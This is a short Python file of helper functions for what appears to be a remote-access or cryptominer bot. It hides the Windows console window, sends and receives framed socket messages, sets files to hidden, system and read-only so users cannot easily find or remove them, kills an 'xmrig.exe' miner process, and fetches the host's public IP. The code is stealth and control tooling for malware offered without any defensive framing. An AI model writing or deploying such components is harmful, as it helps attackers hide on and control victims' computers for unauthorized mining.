import socket
import platform
import ctypes
import subprocess
import os
import stat

def hide_console():
    if platform.system() == 'Windows':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def send_msg(sock, msg):
    msg = msg.encode()
    sock.send(len(msg).to_bytes(4, 'big') + msg)

def recv_msg(sock):
    try:
        raw_len = sock.recv(4)
        if not raw_len:
            return None
        length = int.from_bytes(raw_len, 'big')
        data = b''
        while len(data) < length:
            chunk = sock.recv(min(4096, length - len(data)))
            if not chunk:
                return None
            data += chunk
        return data.decode()
    except:
        return None

def set_hidden_readonly(path):
    try:
        os.chmod(path, stat.S_IREAD | stat.S_IRGRP | stat.S_IROTH)
        subprocess.run(['attrib', '+h', '+s', '+r', path], shell=True, capture_output=True)
    except:
        pass

def kill_xmrig():
    subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], capture_output=True)

def get_public_ip():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org").read().decode().strip()
    except:
        return "Unknown"